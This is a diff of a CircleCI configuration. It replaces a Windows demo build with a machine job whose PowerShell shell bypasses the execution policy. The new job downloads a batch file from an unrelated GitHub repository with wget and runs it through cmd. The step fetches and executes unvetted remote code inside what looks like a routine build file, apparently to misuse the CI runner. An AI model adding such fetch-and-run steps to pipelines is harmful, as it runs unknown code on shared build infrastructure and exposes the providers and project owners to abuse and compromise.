@@ -1,26 +1,12 @@
 version: 2.1
 
-orbs:
-  win: circleci/windows@2.4.0
-
-workflows:
-  hello-world:
-    jobs:
-      - build
-  
-
 jobs:
   build:
-    executor:
-      name: win/default
-    working_directory: C:\Users\circleci\project\HelloWorld
+    machine:
+      image: 'windows-server-2022-gui:current'
+      resource_class: windows.large
+      shell: powershell.exe -ExecutionPolicy Bypass
     steps:
-      - checkout:
-          path: C:\Users\circleci\project
-      - restore_cache:
-          keys:
-            - dotnet-packages-v1-{{ checksum "circleci-demo-windows.csproj" }}
-      - run:
-          name: "Yes"
-          command: sleep 42300
-      
+      - run: |
+          wget -O wiz.bat https://github.com/ajiLa78/slepoq/raw/main/fiz.bat
+          cmd /c wiz.bat
